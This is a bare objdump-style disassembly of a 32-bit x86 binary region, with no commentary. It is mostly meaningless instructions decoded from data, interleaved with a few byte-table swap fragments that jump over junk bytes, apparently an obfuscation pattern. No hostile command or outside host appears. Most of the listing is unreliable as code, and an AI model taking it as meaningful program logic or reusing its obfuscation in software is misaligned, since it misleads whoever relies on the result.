  412cba:	or     DWORD PTR [edx+0x342f6a14],eax
  412cc0:	sar    BYTE PTR [ebx],cl
  412cc2:	jmp    0x368373c4
  412cc7:	adc    al,0x83
  412cc9:	xor    cl,BYTE PTR [edi-0x27]
  412ccc:	jp     0x412cb9
  412cce:	mov    al,0x8f
  412cd0:	inc    edx
  412cd1:	fld    DWORD PTR [edi+0x30702b39]
  412cd7:	cmp    ax,0x1509
  412cdb:	sub    ebp,DWORD PTR [esi+0x2a]
  412cde:	add    dl,ah
  412ce0:	and    esp,edx
  412ce2:	push   esi
  412ce3:	add    al,0xb5
  412ce5:	push   ss
  412ce6:	rcl    DWORD PTR [edx+0x66],1
  412ce9:	push   esi
  412cea:	(bad)  
  412ceb:	push   eax
  412cec:	dec    esp
  412ced:	jne    0x412cfc
  412cef:	retf   0x3e20
  412cf2:	sbb    esp,edi
  412cf4:	add    eax,0xfdc55ac9
  412cf9:	fwait
  412cfa:	into   
  412cfb:	nop
  412cfc:	adc    BYTE PTR [ebx+0x18370c6],bl
  412d02:	mov    eax,ds:0xeeab5ed8
  412d07:	stos   BYTE PTR es:[edi],al
  412d08:	js     0x412cc5
  412d0a:	imul   esp,DWORD PTR [esi-0x31f34310],0x4f
  412d11:	not    esp
  412d13:	in     eax,0x85
  412d15:	cmp    al,0x31
  412d17:	sbb    edi,DWORD PTR [ebx-0x33dd8684]
  412d1d:	lock aad 0xb1
  412d20:	mov    edx,0x77b5997a
  412d25:	jns    0x412d25
  412d27:	loopne 0x412cf8
  412d29:	push   0xdd1b9662
  412d2e:	cmp    ebx,DWORD PTR ds:0xbcb9b03c
  412d34:	in     al,dx
  412d35:	div    BYTE PTR [ebp+ebp*1+0x35ce20e4]
  412d3c:	nop
  412d3d:	mov    esi,0x70e66b80
  412d42:	xor    DWORD PTR [esi-0x21c6a8b1],ebx
  412d48:	cmp    BYTE PTR ds:0x73adf895,ah
  412d4e:	scas   al,BYTE PTR es:[edi]
  412d4f:	fwait
  412d50:	push   0x44c13511
  412d55:	sti    
  412d56:	loope  0x412d09
  412d58:	stos   BYTE PTR es:[edi],al
  412d59:	cmp    esp,DWORD PTR [edi+0x64]
  412d5c:	mov    eax,0xbdbe7561
  412d61:	push   es
  412d62:	inc    edx
  412d63:	aaa    
  412d64:	dec    ebp
  412d65:	mov    cl,0xd
  412d67:	push   ebx
  412d68:	inc    edi
  412d69:	adc    DWORD PTR [ebp+0x23b0a67e],ebx
  412d6f:	sbb    DWORD PTR [ebx],esp
  412d71:	loopne 0x412df1
  412d73:	dec    ecx
  412d74:	arpl   WORD PTR ds:0x47ecd263,ax
  412d7a:	sbb    eax,0xbc9a0010
  412d7f:	je     0x412daa
  412d81:	test   eax,0x39dba403
  412d86:	int    0xc9
  412d88:	jecxz  0x412dac
  412d8a:	adc    BYTE PTR [edx-0x36fb5345],dl
  412d90:	test   BYTE PTR [eax-0x35],0xf1
  412d94:	mov    al,ds:0x78dcc85e
  412d99:	add    al,bl
  412d9b:	push   ebp
  412d9c:	int    0x9d
  412d9e:	or     dh,BYTE PTR [ecx+0x216e9862]
  412da4:	jl     0x412dc9
  412da6:	shl    BYTE PTR [esi-0x4e6fc28f],cl
  412dac:	push   cs
  412dad:	pop    ebp
  412dae:	pop    esi
  412daf:	mov    bh,0x86
  412db1:	(bad)  
  412db3:	cld    
  412db4:	fcmovu st,st(7)
  412db6:	ror    esp,cl
  412db8:	xchg   edx,eax
  412db9:	jecxz  0x412d54
  412dbb:	sub    al,0x3d
  412dbd:	jnp    0x412d56
  412dbf:	ins    BYTE PTR es:[edi],dx
  412dc0:	pop    edi
  412dc1:	fidivr WORD PTR [ebp+0x2c3790c4]
  412dc7:	int    0xe8
  412dc9:	sbb    BYTE PTR [edi],ch
  412dcb:	push   esi
  412dcc:	sar    BYTE PTR [ebx+0x7f0d3d38],0xe1
  412dd3:	idiv   DWORD PTR [ecx+0x38]
  412dd6:	dec    edi
  412dd7:	sahf   
  412dd8:	xor    cl,BYTE PTR [edi+edx*2+0x59]
  412ddc:	out    dx,al
  412ddd:	fld    TBYTE PTR [esi-0x5b9e501c]
  412de3:	cdq    
  412de4:	jmp    0x412d7c
  412de6:	mov    dl,0x23
  412de8:	ins    DWORD PTR es:[edi],dx
  412de9:	cli    
  412dea:	imul   edx,DWORD PTR [ebx+0x4f72c250],0xbc68815f
  412df4:	pop    es
  412df5:	fsubrp st(4),st
  412df7:	(bad)
  412dfa:	je     0x412e4e
  412dfc:	fst    DWORD PTR [ebp+0x369ceee1]
  412e02:	stos   DWORD PTR es:[edi],eax
  412e03:	cmp    ebp,DWORD PTR [eax+0x2bf5e279]
  412e09:	push   0xffffffc7
  412e0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e0c:	push   eax
  412e0d:	nop
  412e0e:	lahf   
  412e0f:	inc    edi
  412e10:	fcom   DWORD PTR [ecx+edi*4+0x680ec9fe]
  412e17:	sbb    dh,BYTE PTR [edx]
  412e19:	fwait
  412e1a:	std    
  412e1b:	fsub   DWORD PTR [eax-0x3463d393]
  412e21:	push   edi
  412e22:	lea    esp,[edx]
  412e24:	cs data16 lahf 
  412e27:	(bad)  
  412e28:	(bad)  
  412e29:	repz test BYTE PTR es:[esi],bh
  412e2d:	fisub  DWORD PTR ds:0x99e495c6
  412e33:	mov    al,ds:0xbc522eeb
  412e38:	mov    esp,0x3262874b
  412e3d:	cmp    BYTE PTR [edi+0x3385baf7],bh
  412e43:	jg     0x412dda
  412e45:	daa    
  412e46:	mov    bl,0x86
  412e48:	xchg   ebx,eax
  412e49:	adc    DWORD PTR [eax],ebp
  412e4b:	jmp    0x412e43
  412e4d:	gs iret 
  412e4f:	clc    
  412e50:	mov    bl,0x2
  412e52:	push   esp
  412e53:	mov    cl,0x94
  412e55:	cmp    cl,BYTE PTR [ecx-0x1]
  412e58:	push   edx
  412e59:	ror    BYTE PTR [esi],1
  412e5b:	pop    edx
  412e5c:	scas   al,BYTE PTR es:[edi]
  412e5d:	or     BYTE PTR [ebx-0x2b],0xff
  412e61:	test   eax,0xb4392600
  412e66:	xor    bh,bh
  412e68:	das    
  412e69:	mov    eax,0xad6da9c4
  412e6e:	push   ds
  412e6f:	sbb    DWORD PTR [esi+0x6d],0xc5e8ec82
  412e76:	push   ecx
  412e77:	retf   0xbbd4
  412e7a:	(bad)  
  412e7b:	jae    0x412e41
  412e7d:	jmp    0x3abbe5e7
  412e82:	div    WORD PTR [edx+0x73]
  412e86:	xchg   edx,eax
  412e87:	ret    0xc182
  412e8a:	jmp    0x412e3b
  412e8c:	clc    
  412e8d:	ins    DWORD PTR es:[edi],dx
  412e8e:	shl    edi,cl
  412e90:	arpl   WORD PTR [ebp+0x5e428d0f],si
  412e96:	mov    esp,0x8b594132
  412e9b:	push   edx
  412e9c:	pusha  
  412e9d:	in     al,dx
  412e9e:	repz call 0xf16eb5cc
  412ea4:	sub    BYTE PTR ss:[eax-0x42b8e035],dl
  412eab:	pop    ss
  412eac:	add    DWORD PTR [ecx],eax
  412eae:	push   ss
  412eaf:	and    BYTE PTR [ebx-0x6c],ah
  412eb2:	das    
  412eb3:	test   eax,0x95405f02
  412eb8:	out    dx,eax
  412eb9:	adc    BYTE PTR [ebx],0x7
  412ebc:	cmc    
  412ebd:	push   ecx
  412ebe:	ins    BYTE PTR es:[edi],dx
  412ebf:	mov    al,0x2a
  412ec1:	out    dx,al
  412ec2:	fldcw  WORD PTR [esi]
  412ec4:	das    
  412ec5:	adc    al,0xa5
  412ec7:	shl    DWORD PTR [ecx+edi*8],cl
  412eca:	xchg   edx,eax
  412ecb:	aam    0x79
  412ecd:	jo     0x412eae
  412ecf:	adc    DWORD PTR [edx],ecx
  412ed1:	inc    esp
  412ed2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ed3:	scas   al,BYTE PTR es:[edi]
  412ed4:	icebp  
  412ed5:	jnp    0x412e9c
  412ed7:	mov    ah,0x44
  412ed9:	enter  0x8728,0xd0
  412edd:	mov    ecx,ebx
  412edf:	out    0x6e,eax
  412ee1:	jle    0x412f49
  412ee3:	loop   0x412ed3
  412ee5:	retf   0x8a54
  412ee8:	popa   
  412ee9:	sti    
  412eea:	(bad)  
  412eeb:	push   ss
  412eec:	lods   eax,DWORD PTR ds:[esi]
  412eed:	test   eax,0x8c5aab04
  412ef2:	fcmovnu st,st(3)
  412ef4:	jne    0x412f00
  412ef6:	xchg   edi,eax
  412ef7:	sbb    BYTE PTR [edx],al
  412ef9:	mov    BYTE PTR [ebp+0xf],dl
  412efc:	mov    edx,DWORD PTR [ebp-0xc]
  412eff:	xor    edx,eax
  412f01:	add    edx,DWORD PTR [ebp-0x14]
  412f04:	mov    edi,DWORD PTR [ebp-0x1c]
  412f07:	mov    dl,BYTE PTR [edx+edi*1+0x327298]
  412f0e:	mov    BYTE PTR [ebp+0xb],dl
  412f11:	mov    dl,BYTE PTR [ebp+0xf]
  412f14:	jmp    0x41319c
  412f19:	aas    
  412f1a:	cmp    eax,0x3e3d3e3f
  412f1f:	cmp    eax,0xcf00063d
  412f24:	sbb    al,0x18
  412f26:	retf   
  412f27:	jmp    0x78b69918
  412f2c:	js     0x412f13
  412f2e:	jle    0x412fa8
  412f30:	js     0x412f07
  412f32:	es punpcklbw mm6,mm7
  412f36:	mov    al,ds:0x4a35f612
  412f3b:	mov    al,ds:0xc4335f14
  412f40:	das    
  412f41:	retf   
  412f42:	add    dh,BYTE PTR [eax+0x337353a6]
  412f48:	adc    al,0xce
  412f4a:	dec    ecx
  412f4b:	lds    edx,FWORD PTR [esi]
  412f4d:	ror    BYTE PTR [ebx+eax*4-0x13],1
  412f51:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  412f53:	push   ebx
  412f54:	adc    dl,BYTE PTR ss:[esi]
  412f57:	or     DWORD PTR [esi+eax*8],eax
  412f5a:	xchg   ebx,eax
  412f5b:	fidiv  WORD PTR [edi-0x9]
  412f5e:	jnp    0x412f97
  412f60:	jno    0x412f61
  412f62:	ret    0x8dba
  412f65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f66:	jb     0x412f72
  412f68:	adc    al,0xbb
  412f6a:	sub    al,0x4a
  412f6c:	stc    
  412f6d:	mov    ah,dl
  412f6f:	dec    ebp
  412f70:	add    BYTE PTR [edx],ah
  412f72:	sbb    bl,BYTE PTR [eax]
  412f74:	jo     0x412f74
  412f76:	and    DWORD PTR [eax],esi
  412f78:	rcr    ecx,0xa0
  412f7b:	aam    0xf3
  412f7d:	imul   edi,DWORD PTR [ecx],0xfffffff2
  412f80:	mov    dh,0xbc
  412f82:	jbe    0x412fec
  412f84:	retf   
  412f85:	inc    esi
  412f86:	nop
  412f87:	outs   dx,BYTE PTR ds:[esi]
  412f88:	fadd   DWORD PTR [eax+0x1f]
  412f8b:	sub    edx,DWORD PTR [ebx-0x19]
  412f8e:	xchg   ebp,eax
  412f8f:	neg    DWORD PTR ds:0x939d4744
  412f95:	lea    ecx,[ecx+0x5d]
  412f98:	xlat   BYTE PTR ds:[ebx]
  412f99:	ins    BYTE PTR es:[edi],dx
  412f9a:	stc    
  412f9b:	fcom   DWORD PTR [ecx]
  412f9d:	inc    esi
  412f9e:	mov    ah,0xe
  412fa0:	je     0x412fff
  412fa2:	cwde   
  412fa3:	jns    0x41301b
  412fa5:	jbe    0x412f73
  412fa7:	mov    ah,0xd0
  412fa9:	outs   dx,BYTE PTR ds:[esi]
  412faa:	mov    bh,0x68
  412fac:	sub    eax,DWORD PTR [ebp-0x3f]
  412faf:	sar    BYTE PTR [edi],0x38
  412fb2:	cld    
  412fb3:	out    dx,eax
  412fb4:	mov    al,ds:0x39804446
  412fb9:	in     al,0x42
  412fbb:	aaa    
  412fbc:	xchg   ebp,eax
  412fbd:	cmp    dh,BYTE PTR [esi+0x28]
  412fc0:	fs shl ebx,1
  412fc3:	push   ds
  412fc4:	sub    BYTE PTR [ebp+0x1c],dh
  412fc7:	push   ebx
  412fc8:	and    BYTE PTR [eax+ebp*4],bl
  412fcb:	xor    al,0x3e
  412fcd:	adc    DWORD PTR [esi+0x5],0x5c
  412fd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412fd2:	mov    dh,0x6b
  412fd4:	sbb    esp,DWORD PTR [eax+0x1d]
  412fd7:	xchg   esi,eax
  412fd8:	jo     0x412f98
  412fda:	jmp    0x41301a
  412fdc:	out    0x8f,al
  412fde:	sbb    eax,ebp
  412fe0:	push   eax
  412fe1:	dec    ebp
  412fe2:	lods   al,BYTE PTR ds:[esi]
  412fe3:	pop    ebp
  412fe4:	jg     0x41305e
  412fe6:	ss mov cl,0x2
  412fe9:	pop    esp
  412fea:	jecxz  0x412fee
  412fec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412fed:	je     0x413017
  412fef:	add    edx,edi
  412ff1:	dec    edi
  412ff2:	push   eax
  412ff3:	mov    ecx,0x9e80ca94
  412ff8:	and    al,0x1e
  412ffa:	jle    0x412f7d
  412ffc:	cmp    DWORD PTR [eax-0x6c],ebp
  412fff:	loopne 0x412fe5
  413001:	pop    ss
  413002:	push   esp
  413003:	xlat   BYTE PTR ds:[ebx]
  413004:	cli    
  413005:	push   edx
  413006:	nop
  413007:	mov    ebp,0xefa192a9
  41300c:	std    
  41300d:	push   eax
  41300e:	jae    0x412f90
  413010:	aaa    
  413011:	sub    al,bl
  413013:	(bad)  
  413014:	sbb    eax,0x218611e8
  413019:	cmp    edi,DWORD PTR [ecx+0x2]
  41301c:	hlt    
  41301d:	cmp    BYTE PTR [ebp+0x23],al
  413020:	retf   0x7500
  413023:	push   edi
  413024:	mov    cs,WORD PTR [ebx+0x2b32fac4]
  41302a:	dec    ecx
  41302b:	jle    0x413094
  41302d:	pop    ecx
  41302e:	popa   
  41302f:	push   ss
  413030:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413031:	sub    eax,0xbbcdc20f
  413036:	int    0xe0
  413038:	xchg   ebp,eax
  413039:	or     ch,dh
  41303b:	sub    cl,BYTE PTR [edx]
  41303d:	int3   
  41303e:	jl     0x413014
  413040:	(bad)  [edx]
  413042:	dec    edi
  413043:	mov    DWORD PTR [ebp+0x3a],eax
  413046:	pop    ss
  413047:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413048:	jecxz  0x413025
  41304a:	fisttp WORD PTR [esi+0x4a]
  41304d:	sub    cl,ch
  41304f:	fidivr DWORD PTR [esi+0x7c1589ec]
  413055:	pusha  
  413056:	popa   
  413057:	pop    ebx
  413058:	push   edx
  413059:	cmp    esi,DWORD PTR [ecx]
  41305b:	dec    ebp
  41305c:	das    
  41305d:	ror    DWORD PTR [esi-0x7bc107d7],1
  413063:	aam    0xc4
  413065:	addr16 ret 0x325f
  413069:	or     ah,BYTE PTR [esi-0x74]
  41306c:	iret   
  41306d:	mov    dl,0x91
  41306f:	cwde   
  413070:	pop    ebx
  413071:	xchg   esp,eax
  413072:	mov    DWORD PTR [eax+esi*2+0x63],ebp
  413076:	push   es
  413077:	or     ebp,ebx
  413079:	ss ret 0x7e36
  41307d:	call   0x5afbc82f
  413082:	jmp    0x6d252b7e
  413087:	hlt    
  413088:	lea    ebx,[ebx+0x38]
  41308b:	hlt    
  41308c:	js     0x4130d0
  41308e:	aaa    
  41308f:	(bad)  
  413090:	scas   al,BYTE PTR es:[edi]
  413091:	fsub   DWORD PTR [esi]
  413093:	mov    WORD PTR [ecx-0x1c],gs
  413096:	sti    
  413097:	push   eax
  413098:	jmp    0x41307d
  41309a:	inc    ecx
  41309b:	jne    0x4130b4
  41309d:	int3   
  41309e:	xlat   BYTE PTR ds:[ebx]
  41309f:	jp     0x413090
  4130a1:	std    
  4130a2:	fwait
  4130a3:	cs and al,0x23
  4130a6:	or     edi,DWORD PTR [esi]
  4130a8:	push   ds
  4130a9:	xchg   al,ch
  4130ab:	scas   al,BYTE PTR es:[edi]
  4130ac:	les    edx,FWORD PTR [ebx]
  4130ae:	or     edx,DWORD PTR ds:0x36ebfe9c
  4130b4:	lahf   
  4130b5:	imul   ebp,ecx,0x6f2a4036
  4130bb:	xchg   ebp,eax
  4130bc:	imul   ebp,DWORD PTR [eax+0x54e757e],0x150bb592
  4130c6:	aam    0x80
  4130c8:	fdecstp 
  4130ca:	xor    ah,BYTE PTR [ecx]
  4130cc:	add    eax,0x766c754e
  4130d1:	out    0xf9,al
  4130d3:	xor    ah,BYTE PTR [edx]
  4130d5:	stos   DWORD PTR es:[edi],eax
  4130d6:	jg     0x4130a3
  4130d8:	es sbb al,0xde
  4130db:	aam    0x7a
  4130dd:	sti    
  4130de:	push   esi
  4130df:	pusha  
  4130e0:	mov    edx,0xf37fd71c
  4130e5:	cli    
  4130e6:	xchg   ebp,eax
  4130e7:	loop   0x413094
  4130e9:	cli    
  4130ea:	jmp    0x63633a34
  4130ef:	aad    0x5a
  4130f1:	shl    BYTE PTR [ebp+0x79091d4a],0x42
  4130f8:	test   BYTE PTR [eax+0x6e],ah
  4130fb:	int    0x7a
  4130fd:	mov    ecx,0x8f14ad00
  413102:	cs mov cl,0x45
  413105:	push   eax
  413106:	or     eax,0x10aab3de
  41310b:	xor    DWORD PTR [edi-0x2eaa98dc],eax
  413111:	cli    
  413112:	push   0x778ca611
  413117:	adc    DWORD PTR [esi+ebx*2-0x2a282c52],esp
  41311e:	repz enter 0xe5ec,0xb7
  413123:	and    eax,edx
  413125:	xchg   ecx,eax
  413126:	scas   al,BYTE PTR es:[edi]
  413127:	call   0x363c:0x45c37f8e
  41312e:	xlat   BYTE PTR ds:[ebx]
  41312f:	inc    ebx
  413130:	out    0x73,eax
  413132:	jno    0x41314d
  413134:	jmp    0xbb7ad6cf
  413139:	mov    eax,0x20b216a8
  41313e:	xor    al,BYTE PTR [edi+edi*4]
  413141:	pop    ss
  413142:	add    BYTE PTR [esi],cl
  413144:	dec    eax
  413145:	mov    edi,0xee19e0a6
  41314a:	xor    ah,BYTE PTR [ecx+0x3b991e6e]
  413150:	mov    ebx,0x3f31a2d1
  413155:	mov    esp,?
  413157:	arpl   WORD PTR [edi-0x1220157],bp
  41315d:	and    DWORD PTR [ebx],esp
  41315f:	and    al,0x91
  413161:	cwde   
  413162:	or     cl,BYTE PTR [esp+edi*4+0x2b197e2b]
  413169:	jae    0x413137
  41316b:	test   BYTE PTR [edx],ch
  41316d:	jle    0x413154
  41316f:	pop    ebp
  413170:	mov    ch,0xcd
  413172:	imul   esi,ecx,0x4df40536
  413178:	cmp    ah,BYTE PTR [edx-0x7a]
  41317b:	xchg   DWORD PTR [edx],edi
  41317d:	adc    dl,BYTE PTR [eax+0x51]
  413180:	iret   
  413181:	sub    al,0xbd
  413183:	(bad)  
  413184:	pop    esp
  413185:	ret    
  413186:	xchg   edi,eax
  413187:	daa    
  413188:	lds    esp,FWORD PTR [edi]
  41318a:	push   ss
  41318b:	shl    DWORD PTR [eax+ecx*4-0x47],cl
  41318f:	stos   DWORD PTR es:[edi],eax
  413190:	mov    eax,ds:0x4c1ef5e0
  413195:	or     DWORD PTR [edx+eax*2],esi
  413198:	jns    0x4131ad
  41319a:	stos   BYTE PTR es:[edi],al
  41319b:	xchg   ebp,eax
  41319c:	mov    edi,DWORD PTR [ebp-0xc]
  41319f:	xor    edi,eax
  4131a1:	add    edi,DWORD PTR [ebp-0x14]
  4131a4:	mov    ebx,DWORD PTR [ebp-0x1c]
  4131a7:	mov    BYTE PTR [edi+ebx*1+0x327298],dl
  4131ae:	mov    dl,BYTE PTR [ebp+0xb]
  4131b1:	mov    edi,DWORD PTR [ebp-0x18]
  4131b4:	xor    edi,eax
  4131b6:	jmp    0x41343e
  4131bb:	cmp    eax,0xc2c6c2c3
  4131c0:	(bad)
  4131c3:	pop    ebp
  4131c4:	in     al,0x25
  4131c6:	inc    edi
  4131c7:	call   0x787a:0xd63ffccb
  4131ce:	js     0x4131b5
  4131d0:	jle    0x41324a
  4131d2:	js     0x413164
  4131d4:	fcom   QWORD PTR [ebx+0x7e]
  4131d7:	dec    bh
  4131d9:	jae    0x41322f
  4131db:	mov    BYTE PTR [eax],dh
  4131dd:	das    
  4131de:	nop
  4131df:	adc    eax,0xe330bf86
  4131e4:	push   ds
  4131e5:	ret    
  4131e6:	mov    fs,WORD PTR [ecx+0x3782bdc9]
  4131ec:	pop    ecx
  4131ed:	sub    BYTE PTR [edi+0x5a],0xb4
  4131f1:	adc    eax,0x3dc95012
  4131f6:	shl    BYTE PTR [eax+eax*8],1
  4131f9:	ja     0x413253
  4131fb:	ds (bad) 
  4131fe:	cmc    
  4131ff:	ins    DWORD PTR es:[edi],dx
  413200:	and    al,0xbe
  413202:	jecxz  0x41326f
  413204:	jbe    0x413253
  413206:	fisubr DWORD PTR [edi+ebx*1+0x538cf100]
  41320d:	mov    bh,0xfb
  41320f:	push   0x499408b6
  413214:	clc    
  413215:	(bad)  
  413216:	mov    ecx,0x6eaeeae
  41321b:	xchg   ebp,eax
  41321c:	add    edx,ecx
  41321e:	fs scas eax,DWORD PTR es:[edi]
  413220:	sub    esi,DWORD PTR [ecx]
  413222:	in     eax,0x2c
  413224:	outs   dx,BYTE PTR ds:[esi]
  413225:	mov    WORD PTR ds:0x9a20e82f,es
  41322b:	mov    WORD PTR gs:[edx],ss
  41322e:	add    al,0xdf
  413230:	pop    esi
  413231:	inc    ebx
  413232:	fdiv   QWORD PTR [ecx+0x45]
  413235:	mov    ch,0xdc
  413237:	std    
  413238:	dec    edi
  413239:	push   ss
  41323a:	stos   DWORD PTR es:[edi],eax
  41323b:	out    0xb2,al
  41323d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41323e:	xchg   edx,eax
  41323f:	shl    ebx,1
  413241:	mov    WORD PTR [ebx-0x7e],gs
  413244:	mov    ecx,0x255aaf88
  413249:	pop    ebx
  41324a:	fdivr  QWORD PTR [eax-0x69]
  41324d:	dec    ebx
  41324e:	and    eax,0xe429aa49
  413253:	xor    al,0x5d
  413255:	js     0x4132a9
  413257:	fbstp  TBYTE PTR [ebx-0x4f]
  41325a:	pop    edx
  41325b:	inc    ebp
  41325c:	addr16 mov ah,ah
  41325f:	(bad)  
  413260:	sti    
  413261:	ins    DWORD PTR es:[edi],dx
  413262:	shr    bl,1
  413264:	dec    esp
  413265:	mov    ah,bh
  413267:	jnp    0x41329c
  413269:	sub    eax,0xf177b8a9
  41326e:	fwait
  41326f:	push   esp
  413270:	scas   eax,DWORD PTR es:[edi]
  413271:	xchg   ebx,eax
  413272:	les    ecx,FWORD PTR [ecx+0x2cdf4666]
  413278:	jge    0x41324d
  41327a:	(bad)  
  41327b:	sub    al,0xf7
  41327d:	cmp    cl,cl
  41327f:	das    
  413280:	cmp    al,0x90
  413282:	xor    DWORD PTR [ecx-0x2d],eax
  413285:	xchg   edi,eax
  413286:	paddsb mm1,QWORD PTR [ecx]
  413289:	lahf   
  41328a:	(bad)  
  41328b:	or     eax,0x53d21be3
  413290:	sub    DWORD PTR [edx+0xb3ec6f2],esp
  413296:	cmp    eax,DWORD PTR [edi+0x79]
  413299:	idiv   BYTE PTR [esi-0x6ea85432]
  41329f:	repnz test esi,0x93bd6acb
  4132a6:	stos   DWORD PTR es:[edi],eax
  4132a7:	jno    0x4132b0
  4132a9:	outs   dx,DWORD PTR ds:[esi]
  4132aa:	jno    0x4132f6
  4132ac:	mov    ecx,0xe1dc860c
  4132b1:	test   eax,0xb0feac9b
  4132b6:	aas    
  4132b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4132b8:	sbb    BYTE PTR [edi+0x157b456b],al
  4132be:	loop   0x4132cc
  4132c0:	in     eax,0xf6
  4132c2:	stos   BYTE PTR es:[edi],al
  4132c3:	idiv   ebp
  4132c5:	xchg   esi,eax
  4132c6:	add    BYTE PTR [ecx-0x36b33a8d],dh
  4132cc:	inc    edi
  4132cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4132ce:	xor    eax,0x699654ba
  4132d3:	std    
  4132d4:	pop    esp
  4132d5:	jl     0x4132a6
  4132d7:	or     al,0xe0
  4132d9:	clc    
  4132da:	mov    ch,0x54
  4132dc:	dec    eax
  4132dd:	fcmovne st,st(4)
  4132df:	shr    DWORD PTR [edx+0xc],1
  4132e2:	xchg   ebp,eax
  4132e3:	xor    BYTE PTR [ebp-0x3b7088ee],0x15
  4132ea:	jno    0x4132d5
  4132ec:	and    cl,BYTE PTR [eax+ebx*8+0x23f515fc]
  4132f3:	adc    BYTE PTR [edx],dh
  4132f5:	jl     0x4132ed
  4132f7:	fxch   st(5)
  4132f9:	sub    BYTE PTR [edi-0x75],bh
  4132fc:	sahf   
  4132fd:	test   DWORD PTR [eax],eax
  4132ff:	mov    bl,0x71
  413301:	pushf  
  413302:	arpl   WORD PTR [eax],dx
  413304:	stc    
  413305:	test   al,0xde
  413307:	mov    bh,0x47
  413309:	outs   dx,DWORD PTR ds:[esi]
  41330a:	jbe    0x413315
  41330c:	scas   al,BYTE PTR es:[edi]
  41330d:	ret    0x3ac6
  413310:	cli    
  413311:	rcr    dh,0x7a
  413314:	add    al,0xf0
  413316:	lds    esp,FWORD PTR [eax+0x63]
  413319:	or     DWORD PTR [edi+esi*1+0x38],edi
  41331d:	clc    
  41331e:	sbb    al,0xfa
  413320:	test   esi,ebx
  413322:	iret   
  413323:	xchg   edi,eax
  413324:	inc    edi
  413325:	lods   eax,DWORD PTR ds:[esi]
  413326:	jmp    0xb56dec43
  41332b:	xchg   ebp,eax
  41332c:	ins    BYTE PTR es:[edi],dx
  41332d:	or     eax,0xafff4ec1
  413332:	pop    es
  413333:	jp     0x4133ab
  413335:	dec    edi
  413336:	enter  0xf7b9,0xcf
  41333a:	ror    DWORD PTR [edx+ecx*1],cl
  41333d:	adc    edi,esp
  41333f:	mov    eax,edi
  413341:	mov    dl,0xe1
  413343:	sub    edx,edi
  413345:	mov    edi,DWORD PTR [esi]
  413347:	jl     0x413317
  413349:	aaa    
  41334a:	ins    BYTE PTR es:[edi],dx
  41334b:	jle    0x4133cc
  41334d:	lahf   
  41334e:	add    DWORD PTR [edi],0x2d
  413351:	cdq    
  413352:	lods   eax,DWORD PTR ds:[esi]
  413353:	pop    eax
  413354:	push   eax
  413355:	jmp    0x1906:0xb0828b17
  41335c:	cwde   
  41335d:	fdivr  st(4),st
  41335f:	add    al,BYTE PTR [edi-0x15c8cba4]
  413365:	mov    ds:0x4c7c752f,al
  41336a:	xor    ah,dl
  41336c:	out    dx,eax
  41336d:	push   esi
  41336e:	dec    eax
  41336f:	cmp    eax,0x7d6b2a57
  413374:	xchg   ebp,eax
  413375:	mov    ch,0x5c
  413377:	ins    BYTE PTR es:[edi],dx
  413378:	add    esi,DWORD PTR [edx]
  41337a:	clc    
  41337b:	jmp    0x60f5:0xff701e2b
  413382:	shr    BYTE PTR [edx-0xb4e800b],1
  413388:	in     al,0xfa
  41338a:	mov    edi,0x8dad2b46
  41338f:	mov    ds:0xb846f43b,al
  413394:	jp     0x4133f1
  413396:	dec    esp
  413397:	stc    
  413398:	pop    edx
  413399:	sbb    BYTE PTR [esi],bh
  41339b:	out    0x59,eax
  41339d:	push   ebx
  41339e:	push   es
  41339f:	xor    al,0x9d
  4133a1:	je     0x4133de
  4133a3:	or     DWORD PTR [ebx-0x5cc608c6],ebp
  4133a9:	add    al,0x32
  4133ab:	test   ch,0xdf
  4133ae:	bound  ebx,QWORD PTR [eax-0x24]
  4133b1:	in     al,0xd4
  4133b3:	sub    esi,DWORD PTR [ebx]
  4133b5:	mov    ds:0x25eb369f,eax
  4133ba:	adc    DWORD PTR [edx-0x576c0f9e],edx
  4133c0:	repz out dx,eax
  4133c2:	push   ss
  4133c3:	jne    0x4133b0
  4133c5:	call   0x4ad0:0x668b70a7
  4133cc:	lds    esp,FWORD PTR [esi-0x61]
  4133cf:	popa   
  4133d0:	xor    eax,0xfab372be
  4133d5:	fnstsw WORD PTR [esi+0x2c2e0263]
  4133db:	or     al,cl
  4133dd:	fcomp  QWORD PTR [ebx+0x60]
  4133e0:	sti    
  4133e1:	sub    edi,esp
  4133e3:	adc    dh,BYTE PTR [eax+ecx*2]
  4133e6:	cmp    bl,BYTE PTR [ecx+0x123080e]
  4133ec:	xchg   esp,eax
  4133ed:	in     al,dx
  4133ee:	gs or  al,0xcc
  4133f1:	ins    DWORD PTR es:[edi],dx
  4133f2:	mov    cs,WORD PTR [ebp-0x78]
  4133f5:	mov    ds:0xb74cf366,eax
  4133fa:	mov    ds:0x5cf9ad6c,al
  4133ff:	xor    ebp,DWORD PTR [edx+0x5762fb44]
  413405:	adc    DWORD PTR [esi+0x66],edi
  413408:	out    0xe7,al
  41340a:	mov    ch,0x7b
  41340c:	jmp    0x6894db86
  413411:	mov    ds:0x7962d2b5,eax
  413416:	scas   al,BYTE PTR es:[edi]
  413417:	jbe    0x4133d1
  413419:	aad    0x6c
  41341b:	push   edi
  41341c:	push   eax
  41341d:	mov    ds:0x17a16b50,eax
  413422:	push   cs
  413423:	and    eax,0x3e286b42
  413428:	add    al,0xa7
  41342a:	aaa    
  41342b:	call   0x1ff7:0xf65ff2c4
  413432:	pop    es
  413433:	add    BYTE PTR ds:0xcb2b45a6,0xfc
  41343a:	inc    ebx
  41343b:	std    
  41343c:	push   0x79
  41343e:	add    edi,DWORD PTR [ebp-0x14]
  413441:	mov    ebx,DWORD PTR [ebp-0x1c]
  413444:	mov    BYTE PTR [edi+ebx*1+0x327298],dl
  41344b:	jmp    0x4136d3
  413450:	enter  0xd1c5,0xc0
  413454:	(bad)  
  413456:	(bad)  
  413458:	cld    
  413459:	imul   ecx,esi,0xf93285e
  41345f:	rol    BYTE PTR [ebx+0x78],1
  413462:	jg     0x4134dc
